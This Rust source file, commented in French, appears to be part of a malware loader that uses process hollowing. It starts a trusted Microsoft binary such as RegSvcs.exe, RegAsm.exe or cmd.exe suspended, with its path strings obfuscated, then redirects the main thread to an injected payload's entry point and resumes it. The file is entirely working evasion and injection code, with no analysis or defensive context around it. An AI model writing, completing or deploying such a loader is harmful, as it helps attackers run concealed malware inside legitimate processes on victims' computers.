use std::ptr;
use std::ffi::CString;
use obfstr::obfstr;
use winapi::um::processthreadsapi::{CreateProcessA, GetThreadContext, SetThreadContext, ResumeThread};
use winapi::um::winbase::CREATE_SUSPENDED;
use winapi::um::winnt::CONTEXT_FULL;

// Trouve et lance un hôte parmi la liste de binaires MS
pub unsafe fn spawn_suspended_host() -> Option<winapi::um::processthreadsapi::PROCESS_INFORMATION> {
    let mut si = std::mem::zeroed();
    let mut pi = std::mem::zeroed();

    let hosts = [
        obfstr!("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe"),
        obfstr!("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe"),
        obfstr!("C:\\Windows\\System32\\cmd.exe")
    ];

    for path in hosts {
        let cmd = CString::new(path).unwrap();
        if CreateProcessA(cmd.as_ptr(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, CREATE_SUSPENDED, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi) != 0 {
            return Some(pi);
        }
    }
    None
}

// Détourne le flux d'exécution vers l'Entry Point du payload
pub unsafe fn hijack_thread(pi: &winapi::um::processthreadsapi::PROCESS_INFORMATION, base_addr: usize, entry_point_rva: u32) {
    let mut ctx = std::mem::zeroed::<winapi::um::winnt::CONTEXT>();
    ctx.ContextFlags = CONTEXT_FULL;

    if GetThreadContext(pi.hThread, &mut ctx) != 0 {
        ctx.Rip = base_addr as u64 + entry_point_rva as u64;
        ctx.Rcx = base_addr as u64;
        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);
    }
}
